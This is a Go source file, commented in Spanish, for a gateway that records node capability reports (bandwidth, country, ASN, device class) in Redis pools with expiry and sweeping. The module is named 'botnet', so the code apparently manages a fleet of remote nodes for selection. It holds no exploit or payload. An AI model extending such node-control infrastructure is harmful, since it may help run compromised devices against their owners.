package main

import (
	"context"
	"fmt"
	"strconv"
	"time"

	"github.com/redis/go-redis/v9"

	"github.com/botnet/botnet/internal/agent"
	"github.com/botnet/botnet/pkg/proto"
)

// HELLO de capacidades en el gateway (EP-09 T-0901, §10): el nodo publica
// {bw_mbps, iso2, asn, device_class} y el gateway lo vierte a Redis —
// `node:{id}:caps` con TTL 24 h y `gw:pool:{gw}` con el miembro. Las
// capacidades son datos del gateway, publicados por el propio nodo: la
// seleccion tiene de donde elegir (unica cura del S1 A2-01).

// CapsTTLDefault: un nodo sin HELLO en 24 h expira de caps y sale del
// pool en el barrido (§10). El campo TTL lo acelera en tests.
const CapsTTLDefault = 24 * time.Hour

// Nombres exactos de los 4 campos de node:{id}:caps (AC1: exactly estos
// cuatro, nada mas).
const (
	CapsFieldBWMbps      = "bw_mbps"
	CapsFieldISO2        = "iso2"
	CapsFieldASN         = "asn"
	CapsFieldDeviceClass = "device_class"
)

// CapsKey es la clave HSET de capacidades del nodo (id uuid canonico).
func CapsKey(nodeID string) string { return "node:" + nodeID + ":caps" }

// PoolKey es el set de miembros del pool propio del gateway.
func PoolKey(gwID string) string { return "gw:pool:" + gwID }

// CapsPublisher vierte HELLOs a Redis con TTL y alta en el pool propio.
type CapsPublisher struct {
	RDB  *redis.Client
	GWID string
	TTL  time.Duration // CapsTTLDefault si <= 0
}

func ttl(p *CapsPublisher) time.Duration {
	if p.TTL > 0 {
		return p.TTL
	}
	return CapsTTLDefault
}

// Publish escribe las 4 capacidades, fija el TTL y anade el nodo al pool
// del gateway. Idempotente: re-HELLO solo renueva TTL y valores.
func (p *CapsPublisher) Publish(ctx context.Context, nodeID [16]byte, caps proto.HelloCaps) error {
	id := agent.FormatUUID(nodeID)
	pipe := p.RDB.TxPipeline()
	pipe.HSet(ctx, CapsKey(id),
		CapsFieldBWMbps, strconv.Itoa(int(caps.BWMbps)),
		CapsFieldISO2, caps.ISO2,
		CapsFieldASN, strconv.FormatUint(uint64(caps.ASN), 10),
		CapsFieldDeviceClass, string(rune(caps.DeviceClass)),
	)
	pipe.Expire(ctx, CapsKey(id), ttl(p))
	pipe.SAdd(ctx, PoolKey(p.GWID), id)
	if _, err := pipe.Exec(ctx); err != nil {
		return fmt.Errorf("gw: publish caps node %s: %w", id, err)
	}
	return nil
}

// IngestHello decodifica un CtrlFrame de FrameHello y lo publica: la via
// de produccion (el HELLO llega por el tunel existente, AC2).
func (p *CapsPublisher) IngestHello(ctx context.Context, wire []byte) error {
	f, err := proto.DecodeFrame(wire)
	if err != nil {
		return err
	}
	if f.Type != proto.FrameHello {
		return fmt.Errorf("gw: HELLO: frame tipo %v: %w", f.Type, proto.ErrInvalidLen)
	}
	var caps proto.HelloCaps
	if err := caps.Unmarshal(f.Payload); err != nil {
		return err
	}
	return p.Publish(ctx, f.NodeID, caps)
}

// Sweep expulsa del pool los miembros cuyas caps ya expiraron (AC3: sin
// HELLO en 24 h, SCARD decrece). Devuelve cuantos salieron.
func (p *CapsPublisher) Sweep(ctx context.Context) (int, error) {
	members, err := p.RDB.SMembers(ctx, PoolKey(p.GWID)).Result()
	if err != nil {
		return 0, fmt.Errorf("gw: sweep pool %s: %w", p.GWID, err)
	}
	removed := 0
	for _, m := range members {
		n, err := p.RDB.Exists(ctx, CapsKey(m)).Result()
		if err != nil {
			return removed, fmt.Errorf("gw: sweep caps %s: %w", m, err)
		}
		if n == 0 {
			if err := p.RDB.SRem(ctx, PoolKey(p.GWID), m).Err(); err != nil {
				return removed, err
			}
			removed++
		}
	}
	return removed, nil
}
